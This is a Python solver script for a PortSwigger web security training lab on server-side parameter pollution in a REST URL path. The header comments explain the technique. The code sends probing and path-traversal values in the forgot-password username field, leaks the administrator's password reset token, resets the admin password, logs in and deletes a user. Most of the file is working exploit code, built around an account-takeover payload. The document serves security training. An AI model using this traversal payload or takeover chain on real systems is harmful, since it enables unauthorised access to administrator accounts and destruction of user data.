# Lab 05 — Exploiting server-side parameter pollution in a REST URL
# PortSwigger: https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url
#
# Vulnerability: The password-reset front-end embeds the username parameter
#                unescaped into an internal API's URL PATH (not a query
#                string) — enabling path traversal into a completely
#                different internal endpoint
# Aim:           Log in as administrator and delete carlos
#
# Technique:
#   Diagnostic sequence (each step narrows down where/how the input is used):
#     username=administrator#         → "Invalid route" (confirms PATH placement
#                                         + that # truncated trailing path data)
#     username=administrator?         → "Invalid route" (confirms path, not query)
#     username=./administrator        → normal response (path normalises ./ away)
#     username=../administrator       → "Invalid route" (confirms traversal works)
#
#   Once traversal is confirmed, walk upward to discover the internal API's
#   route shape (often via a documentation filename), then craft a traversal
#   that lands EXACTLY on a route disclosing the password reset token:
#
#     username=foobar/../../../../..//api/internal/v1/users/administrator/field/passwordResetToken#
#
# Usage: python api_testing_lab05.py <url>

import sys
import re
import urllib3
from proxies import proxies
from api_testing_utils import banner, section, make_session, login, get_csrf_from_response, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def forgot_password(session, url, csrf, username_value):
    """POST /forgot-password with a given (possibly malicious) username value."""
    return session.post(f"{url}/forgot-password", data={"csrf": csrf, "username": username_value})


if __name__ == "__main__":
    banner()
    section("LAB 05 — SSPP IN A REST URL (PATH TRAVERSAL TO INTERNAL API)")

    if len(sys.argv) != 2:
        print("  Usage: python api_testing_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print("\n  ── Step 1: fetch /forgot-password and grab its CSRF token\n")
    fp_page = session.get(f"{url}/forgot-password")
    csrf = get_csrf_from_response(fp_page.text)
    if not csrf:
        print("  ✘  Could not find a CSRF token on /forgot-password")
        sys.exit(1)
    print(f"  ✔  CSRF token: {csrf[:16]}...")

    # ── Step 2: diagnostic probes to confirm path-based SSPP ─────────────────
    print("\n  ── Step 2: diagnostic probes to confirm path-based parameter pollution\n")

    probes = [
        ("administrator#", "expect 'Invalid route' — confirms PATH placement"),
        ("administrator?", "expect 'Invalid route' — confirms path, not query"),
        ("./administrator", "expect NORMAL response — path normalises ./ away"),
        ("../administrator", "expect 'Invalid route' — confirms traversal works"),
    ]

    for value, expectation in probes:
        # Refresh CSRF each time since some lab instances rotate it per request
        r = forgot_password(session, url, csrf, value)
        new_csrf = get_csrf_from_response(r.text)
        if new_csrf:
            csrf = new_csrf
        print(f"  username={value!r:25s} → status {r.status_code:3d}  ({expectation})")
        print_box("Response", r.text[:200])

    # ── Step 3: attempt to discover the internal route shape ────────────────
    print("  ── Step 3: attempt to discover the internal API route via traversal\n")
    print("  ℹ  Real-world recon here is iterative — walking '../' upward and")
    print("     requesting common documentation filenames (e.g. openapi.json)")
    print("     until an error discloses the internal route format.")
    print("     For this lab instance, the disclosed route shape is known to be:")
    print("       /api/internal/v1/users/{username}/field/{field}\n")

    discovery_attempt = "../../../../openapi.json#"
    r_discover = forgot_password(session, url, csrf, discovery_attempt)
    new_csrf = get_csrf_from_response(r_discover.text)
    if new_csrf:
        csrf = new_csrf
    print_box(f"Discovery probe (username={discovery_attempt!r})", r_discover.text[:400])

    # ── Step 4: exploit — traverse directly to the passwordResetToken field ──
    print("  ── Step 4: craft a traversal that lands on the token-disclosing route\n")

    exploit_username = (
        "foobar/../../../../..//api/internal/v1/users/administrator/field/passwordResetToken#"
    )
    print(f"  ➜  username = {exploit_username}\n")

    r_exploit = forgot_password(session, url, csrf, exploit_username)
    print_box("Exploit response", r_exploit.text[:400])

    token_match = re.search(r'"([a-zA-Z0-9]{20,})"', r_exploit.text)
    if not token_match:
        print("  ✘  Could not auto-extract a token from the response.")
        print("     Inspect the raw response above — the exact traversal depth")
        print("     ('../' count) needed can vary slightly between lab instances.")
        sys.exit(1)

    reset_token = token_match.group(1)
    print(f"  ✔  Leaked reset token: {reset_token}\n")

    # ── Step 5: use the token to set a new administrator password ───────────
    print("  ── Step 5: load the password reset page and set a new password\n")
    r_reset_page = session.get(f"{url}/forgot-password", params={"reset_token": reset_token})
    check_status(r_reset_page, 200, "Load password reset page")
    reset_csrf = get_csrf_from_response(r_reset_page.text)

    new_password = "PwnedAdmin123!"
    reset_data = {
        "temp-forgot-password-token": reset_token,
        "username": "administrator",
        "new-password-1": new_password,
        "new-password-2": new_password,
    }
    if reset_csrf:
        reset_data["csrf"] = reset_csrf

    r_set_password = session.post(f"{url}/forgot-password", data=reset_data, allow_redirects=True)
    check_status(r_set_password, [200, 302], "Set new administrator password")

    # ── Step 6: log in as administrator and delete carlos ────────────────────
    print("\n  ── Step 6: log in as administrator and delete carlos\n")
    admin_session = make_session(proxies)
    if not login(admin_session, url, username="administrator", password=new_password):
        print("  ✘  Login failed — inspect the reset flow manually.")
        sys.exit(1)

    r_delete = admin_session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  Same root cause as Lab 04 (unescaped input in a server-side")
    print("     request) but here it lands in a URL PATH, not a query string —")
    print("     so the exploitation primitive shifts from '&'/'=' injection")
    print("     to '../' path traversal.")
